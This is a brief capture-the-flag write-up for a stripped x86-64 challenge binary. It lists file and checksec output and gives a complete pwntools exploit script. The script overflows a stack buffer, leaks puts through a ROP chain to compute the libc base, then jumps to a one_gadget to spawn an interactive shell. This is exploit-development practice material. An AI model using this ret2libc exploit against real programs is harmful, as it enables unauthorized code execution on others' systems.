# the weather

file: `#x86_64` `#stripped`  
vuln: `#bof`  
soln: `#ret2libc`  
  
* File
```sh
$ file theweather 
theweather: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4c3a8420c220ce98f45b751ae8bf3ea70bf075d7, stripped
```
  
* checksec.sh
```sh
$ checksec.sh --file theweather 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   theweather

```
  
* exploit
```python
from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./theweather"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 184
payload += p64(0x403d43)    # pop rdi ; ret  ;
payload += p64(0x605018)    # puts@got
payload += p64(0x4005c0)    # puts@plt
payload += p64(0x403878)

p.recvuntil("What's your name? ")
p.sendline(payload)
p.recvuntil("See you later!\n")
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.info("puts_got: 0x{:08x}".format(puts_got))

puts_off = 0x809c0
libc_base = puts_got - puts_off
log.info("libc_base: 0x{:08x}".format(libc_base))

one_shot = 0x4f322
one_gadget = libc_base + one_shot

payload2 = b""
payload2 += b"A" * 184
payload2 += p64(0x4005a6)    # ret
payload2 += p64(one_gadget)

p.recvuntil("What's your name? ")
p.sendline(payload2)
p.recvuntil("See you later!\n")

p.interactive()

```
